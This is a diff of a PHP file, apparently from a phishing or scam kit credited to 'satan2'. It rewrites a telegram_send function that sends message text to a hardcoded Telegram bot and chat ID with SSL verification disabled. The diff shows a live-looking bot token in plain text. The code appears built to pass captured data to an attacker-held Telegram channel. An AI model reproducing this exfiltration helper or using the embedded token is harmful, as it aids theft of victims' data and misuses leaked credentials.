@@ -10,34 +10,19 @@
  * Author URI  :   https://www.facebook.com/satan2
  */
 
-function telegram_send($message, $encodage) {
-    $api_key  = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'; // Token de ton bot
-    $chat_id  = '6297861735'; // ID du chat ou du groupe
-    $format   = 'HTML';
-
-    // On encode correctement le message pour éviter les problèmes d'espaces et caractères spéciaux
-    $msg_encoded = rawurlencode($message);
-
-    $url = "https://api.telegram.org/bot{$api_key}/sendMessage?chat_id={$chat_id}&text={$msg_encoded}&parse_mode={$format}";
-
+function telegram_send($message,$encodage) {
     $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, $url);
+    $api_key  = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A';
+    $chat_id  = '6297861735';
+    $format   = 'HTML';
+    $encod = $encodage;
+    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-
     $result = curl_exec($curl);
-
-
-if ($result === false) {
-    echo "Erreur cURL : " . curl_error($curl);
-} else {
-    echo "Réponse Telegram : " . $result;
+    curl_close($curl);
+    return true;
 }
-
-curl_close($curl);
-return true;
-}
-
 
 
 function is_invalid_class($array, $key) {
